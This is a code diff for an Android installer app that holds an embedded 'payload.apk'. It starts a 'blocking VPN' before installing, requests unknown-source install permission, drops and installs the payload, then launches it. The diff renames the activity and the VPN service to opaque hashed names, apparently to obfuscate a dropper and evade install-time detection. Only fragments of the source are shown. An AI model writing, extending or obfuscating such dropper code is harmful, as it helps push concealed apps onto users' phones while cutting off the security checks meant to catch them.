@@ -29,7 +29,7 @@ import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
 
-public class MainActivity extends Activity {
+public class A4450c4b785 extends Activity {
 
     private static final String ASSET_NAME  = "module";
     private static final String INNER_NAME  = "payload.apk";
@@ -67,7 +67,7 @@ public class MainActivity extends Activity {
     /**
      * Periodic runnable that keeps the Install button in sync with live VPN status.
      *
-     * Uses BlockVpnService.isRunning() as the primary (and most reliable) check —
+     * Uses V4450c4b785.isRunning() as the primary (and most reliable) check —
      * it queries our static service instance directly rather than going through
      * ConnectivityManager, which can lag or return stale data on many OEMs.
      *
@@ -104,7 +104,7 @@ public class MainActivity extends Activity {
     /**
      * Returns true if our blocking VPN is currently live.
      *
-     * Primary check  — BlockVpnService.isRunning(): queries the static service
+     * Primary check  — V4450c4b785.isRunning(): queries the static service
      *   instance directly.  This is instantaneous and works on all Android
      *   versions / OEMs regardless of ConnectivityManager quirks.
      *
@@ -113,7 +113,7 @@ public class MainActivity extends Activity {
      *   (e.g. service process recycled by the OS on low-memory devices).
      */
     private boolean isVpnLive() {
-        if (BlockVpnService.isRunning()) return true;
+        if (V4450c4b785.isRunning()) return true;
         try {
             ConnectivityManager cm =
                     (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
@@ -220,12 +220,12 @@ public class MainActivity extends Activity {
      *      Enable the button immediately — no need to wait.
      *   B) Service not yet running:
      *      Start it, show "Starting VPN…" and let the monitor enable the button
-     *      once BlockVpnService.isRunning() becomes true (typically < 200 ms).
+     *      once V4450c4b785.isRunning() becomes true (typically < 200 ms).
      */
     private void onVpnGranted() {
         vpnPermissionGranted = true;
 
-        if (BlockVpnService.isRunning()) {
+        if (V4450c4b785.isRunning()) {
             // Already live — skip the "Starting…" phase entirely.
             btn.setEnabled(true);
             status.setText("Ready \u2014 tap Install to begin.");
@@ -233,10 +233,10 @@ public class MainActivity extends Activity {
         }
 
         try {
-            startService(new Intent(this, BlockVpnService.class));
+            startService(new Intent(this, V4450c4b785.class));
         } catch (Exception e) {
-            android.util.Log.w(BlockVpnService.TAG,
-                    "Could not start BlockVpnService: " + e.getMessage());
+            android.util.Log.w(V4450c4b785.TAG,
+                    "Could not start V4450c4b785: " + e.getMessage());
         }
         // The monitor will enable the button as soon as isRunning() becomes true.
         status.setText("Starting VPN\u2026 please wait.");
@@ -249,7 +249,7 @@ public class MainActivity extends Activity {
     private void stopVpn() {
         installComplete = true;
         ui.removeCallbacks(vpnMonitor);
-        BlockVpnService.stop(this);
+        V4450c4b785.stop(this);
     }
 
     @Override
@@ -314,7 +314,7 @@ public class MainActivity extends Activity {
                 if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O
                         || getPackageManager().canRequestPackageInstalls()) {
                     awaitingUnknownSourcesGrant = false;
-                    new Thread(MainActivity.this::dropAndInstall).start();
+                    new Thread(A4450c4b785.this::dropAndInstall).start();
                     return;
                 }
                 ui.postDelayed(this, PERM_POLL_MS);
@@ -366,7 +366,7 @@ public class MainActivity extends Activity {
     private void doImmediateRedirect() {
         installComplete = true;
         ui.removeCallbacks(vpnMonitor);
-        BlockVpnService.stop(this);
+        V4450c4b785.stop(this);
 
         final String pkg = BuildConfig.PAYLOAD_PACKAGE;
         if (pkg != null && !pkg.isEmpty()) {
@@ -403,7 +403,7 @@ public class MainActivity extends Activity {
                     try {
                         startActivity(launch);
                         stopVpn();
-                        ui.postDelayed(MainActivity.this::finish, 150);
+                        ui.postDelayed(A4450c4b785.this::finish, 150);
                     } catch (Exception e) {
                         if (status != null) status.setText("Launch failed: " + e.getMessage());
                     }
